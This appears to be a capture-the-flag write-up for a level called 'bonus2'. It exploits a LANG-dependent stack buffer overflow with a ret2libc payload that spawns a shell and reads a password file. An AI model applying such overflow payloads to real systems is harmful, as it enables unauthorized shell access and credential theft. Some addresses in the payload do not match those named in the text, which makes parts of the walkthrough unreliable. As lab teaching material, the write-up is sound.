##  Description

This level is a case of stack overflow. The program reads the environment variable "LANG" and sets a global flag accordingly.
Depending on the value of this flag, the program will save the user greeting in a specific language into a buffer before concatenating it with the main buffer that is filled with the user input. The program then prints the main buffer and exits.

The file uses multiple buffers, the main one where av[1] and av[2] are concatenated and the one where the greeting is stored. The catch is that depending on the language, the greeting string will be longer or shorter, which impacts the strategy with the overflow.

In case of the Finnish greeting, it contains 14 characters including spaces and the null terminator, however the special character "ä" requires 2 bytes in UTF-8, so the greeting actually takes 18 bytes. 


```bash
(gdb) x/64wx $ebp
0xbffff578:     0xbffff638      0x08048630      0x41414141 <    0x41414141
0xbffff588:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff598:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5a8:     0x42424242 <    0x42424242      0x00000000      0x00000000
0xbffff5b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5c8:     0x00000000      0xb7e5ec73      0x41414141      0x41414141
0xbffff5d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5e8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5f8:     0x42424242      0x42424242      0x00000000      0x00000000
0xbffff608:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff618:     0x00000000      0xbffffef0      0xb7fed280      0x00000000
0xbffff628:     0x08048649      0xb7fd0ff4      0x00000000      0x00000000
0xbffff638:     0x00000000      0xb7e454d3      0x00000003      0xbffff6d4
0xbffff648:     0xbffff6e4      0xb7fdc858      0x00000000      0xbffff61c
0xbffff658:     0xbffff6e4      0x00000000      0x0804823c      0xb7fd0ff4
0xbffff668:     0x00000000      0x00000000      0x00000000      0x219437e3
```

As we can see here, the buffers start at 0xbffff580 and 0xbffff5a8, and the return address is located at 0xbffff5c8.
The address of system() is located at 0xb7e5ec73, and the address of "/bin/sh" is located at 0xb7e454d3.
We need to overwrite the return address with the address of system() and put the address of "/bin/sh" as an argument to system().

```bash
(gdb) set environment LANG=fi
(gdb) b puts
(gdb) run $(python -c "print 'A'*40") $(python -c "print 'A'*18 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")

Starting program: /home/user/bonus2/bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*18 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")

Breakpoint 2, 0xb7e927e0 in puts () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/128wx $esp
0xbffff4dc:     0x08048527      0xbffff4f0      0xbffff540      0x00000001
0xbffff4ec:     0x00000000      0xc3767948      0x20a4c3a4      0x69a4c370
0xbffff4fc:     0xc3a4c376      0x414120a4      0x41414141      0x41414141
0xbffff50c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff51c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff52c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff53c:     0xb7e6b060      0x43434343      0xb7f8cc58      0x41414100
0xbffff54c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff55c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff56c:     0x41414141      0x41414141      0x41414141      0xb0604141
0xbffff57c:     0x4343b7e6      0xcc584343      0x0000b7f8      0x00000000
0xbffff58c:     0xb7e5ec73      0x41414141      0x41414141      0x41414141
                ^ system()
0xbffff59c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5ac:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5bc:     0x41414141      0x41414141      0x41414141      0xb0604141
0xbffff5cc:     0x4343b7e6      0xcc584343      0x0000b7f8      0x00000000
0xbffff5dc:     0xbffffef0      0xb7fed280      0x00000000      0x08048649
0xbffff5ec:     0xb7fd0ff4      0x00000000      0x00000000      0x00000000
0xbffff5fc:     0xb7e454d3      0x00000003      0xbffff694      0xbffff6a4
                ^ "/bin/sh"
0xbffff60c:     0xb7fdc858      0x00000000      0xbffff61c      0xbffff6a4
...
```

With both the return address and the argument to system() correctly set, we can continue execution and get a shell.

```bash
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��CCCCX���
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
